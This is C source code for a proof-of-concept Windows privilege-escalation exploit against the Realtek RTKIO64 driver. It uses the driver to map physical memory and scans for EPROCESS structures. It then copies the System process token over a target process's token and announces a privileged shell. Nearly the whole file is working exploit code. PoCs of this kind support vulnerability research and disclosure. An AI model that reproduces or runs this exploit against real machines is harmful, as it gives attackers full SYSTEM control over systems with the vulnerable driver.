#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include "realtek_rtkio64_sys_priv_esc.h"
#include <errno.h>

int main(int argc, char **argv)
{
	printf("\n### Realtek RTKIO64 driver privilege escalation PoC ###\n\n");

	HANDLE dev = open_device(DEVICE_NAME);
	if (dev == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device!\n");
		return -1;
	}

	if (get_help_opt(argc, argv) != NULL)
	{
		printf("\n");
		printf("Usage:\n\n");

		printf("  %s [-userPID 1234] [-privilegedPID 1234] [-startAddr 0x080000000] [-endAddr 0x140000000]\n\n", argv[0]);
		printf("	-userPID			: PID of the process to elevate the privileges (default : current process)\n");
		printf("	-privilegedPID			: PID of the process to steal the token from (default : 4 - \"System process\")\n");
		printf("	-startAddr			: physical memory to start mapping from (default : 0x%016I64X)\n", START_ADDRESS);
		printf("	-endAddr			: physical memory to stop mapping at (default : 0x%016I64X)\n", END_ADDRESS);
		printf("\n");
		return 1;
	}

	// process ID to give the privileges to (by default, the parent process of the current process)
	DWORDLONG user_pid = get_user_pid_opt(argc, argv) ? get_user_pid_opt(argc, argv) : get_parent_pid(GetCurrentProcessId());
	//DWORDLONG user_pid = get_parent_pid(GetCurrentProcessId());

	// PID of the privileged process to steal the token from (4 by default which is the "System" process)
	DWORDLONG priv_pid = get_priv_pid_opt(argc, argv) ? get_priv_pid_opt(argc, argv) : 4;
	//DWORDLONG priv_pid = 4;

	UINT64 phys_start_address = get_start_address_opt(argc, argv) ? get_start_address_opt(argc, argv) : START_ADDRESS;
	UINT64 phys_end_address = get_end_address_opt(argc, argv) ? get_end_address_opt(argc, argv) : END_ADDRESS;

	// this variable will contain the stolen token value
	DWORD stolen_token = 0;

	// this will contain the ptr to the EPROCESS token of the targeted process (current process by default)
	UINT64 current_token_ptr = 0;

	// This is the input buffer used to communicate with the driver
	PINBUF inBuffer = (PINBUF)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(INBUF));
	
	// The size to map will always be the same through the code
	inBuffer->size_to_map = BUFF_SIZE;

	// mapped_address will hold the pointer to the mapped kernel memory
	BYTE * mapped_address;

	printf("	Targeted privileged process PID		: %i\n", priv_pid);
	printf("	Targeted user process PID		: %i\n", user_pid);
	printf("	Physical start address			: 0x%016I64X\n", phys_start_address);
	printf("	Physical end address			: 0x%016I64X\n\n", phys_end_address);

	printf("# Started scanning memory. This may take a while...\n\n");
	// ## MAIN LOOP ##
	for (UINT64 phys_addr_iterator = phys_start_address; phys_addr_iterator < phys_end_address; phys_addr_iterator = phys_addr_iterator + BUFF_SIZE)
	{
		// setup phys_addr_iterator
		inBuffer->addr_to_map = phys_addr_iterator;

		// talk with driver
		mapped_address = map_kernel_buffer(dev, inBuffer);

		// print debug message from time to time
		if (phys_addr_iterator % 0x1000000 == 0) printf("# Currently scanning : 0x%016I64X\n\n", phys_addr_iterator);

		// if mapped_address pointer is not NULL, start searching
		if (mapped_address != NULL)
		{
			// iterate on the currently mapped blob
			for (UINT64 current_blob_iterator = 0; current_blob_iterator < BUFF_SIZE-50; current_blob_iterator++)
			{
				// temporary ptr to currently searched blob
				BYTE * current_blob_ptr = (BYTE *)(mapped_address + current_blob_iterator);

				// just in case, check if we can read the memory
				if (IsBadReadPtr(current_blob_ptr,4) == 0 && IsBadReadPtr(current_blob_ptr + OFFSET_IMAGEFILENAME, 15) == 0 && IsBadReadPtr(current_blob_ptr + OFFSET_PRIORITYCLASS, 1) == 0)
				{
					// setup needles used to search for EPROCESS structure (the more we have the more robust the search will be)
					UINT32	proc_match_candidate			=	*(UINT32 *)	(current_blob_ptr);
					BYTE	pclass_match_candidate			=	*(BYTE *)	(current_blob_ptr + OFFSET_PRIORITYCLASS);
					UINT32	processlock_match_candidate		=	*(UINT32 *)	(current_blob_ptr + OFFSET_PROCESSLOCK);
					CHAR *	imageFileName_candidate			=	(CHAR *)(current_blob_ptr + OFFSET_IMAGEFILENAME);

					// "Proc" == 0x636f7250
					// We will be looking for Proc tagged pool structures which in turn contain EPROCESS structure in them
					if (proc_match_candidate == 0x636f7250 && pclass_match_candidate == 0x2 && processlock_match_candidate == 0x0 && imageFileName_candidate[0] > 0x30 && imageFileName_candidate[0] < 0x7a)
					{

						printf("\tFOUND \"Proc\" tagged pool!\n\n");
						printf("\t\tProcess name : ");
						for (int k = 0; k < 15; k++)
						{
							putchar(*(char *)(current_blob_ptr + OFFSET_IMAGEFILENAME + k));
						}
						printf("\n");
						printf("\t\tPID : %i\n", *(UINT *)(current_blob_ptr + OFFSET_UNIQUEPROCESSID));
						printf("\t\tTOKEN : 0x%08I64X\n", *(DWORD *)(current_blob_ptr + OFFSET_TOKEN));
						printf("\n");


						// Is this our current process we are looking for? (we first check if we found it already)
						if (current_token_ptr == NULL && *(DWORD *)(current_blob_ptr + OFFSET_UNIQUEPROCESSID) == user_pid)
						{
							printf("\t\tFOUND current process! (storing address for later)\n\n");
							current_token_ptr = phys_addr_iterator + current_blob_iterator + OFFSET_TOKEN;
						}
						// Is this the privileged process we are looking for ? (we first check if we found it already)
						if (stolen_token == NULL && *(DWORD *)(current_blob_ptr + OFFSET_UNIQUEPROCESSID) == priv_pid)
						{
							printf("\t\tFOUND privileged token! (saving token for later)\n\n");
							stolen_token = *(DWORD *)(current_blob_ptr + OFFSET_TOKEN);
						}

						// Do we have all we need to privesc ?
						if (stolen_token != NULL && current_token_ptr != NULL)
						{
							inBuffer->addr_to_map = current_token_ptr;
							mapped_address = (BYTE *)map_kernel_buffer(dev, inBuffer);
							printf("Overwriting token of targeted process\n");
							printf("OLD TOKEN : 0x%08I64X\n", *(DWORD *)mapped_address);
							*(DWORD *)mapped_address = stolen_token;
							printf("NEW TOKEN : 0x%08I64X\n", *(DWORD *)mapped_address);
							printf("Enjoy your privileged shell!\n");
							return 0;
						}
					}
				}
				
			}

		}
	}
	
	printf("Exploit finished but the privilege escalation did not succeed.\n");

	system("pause");
	close_device(dev);
	return 0;
}
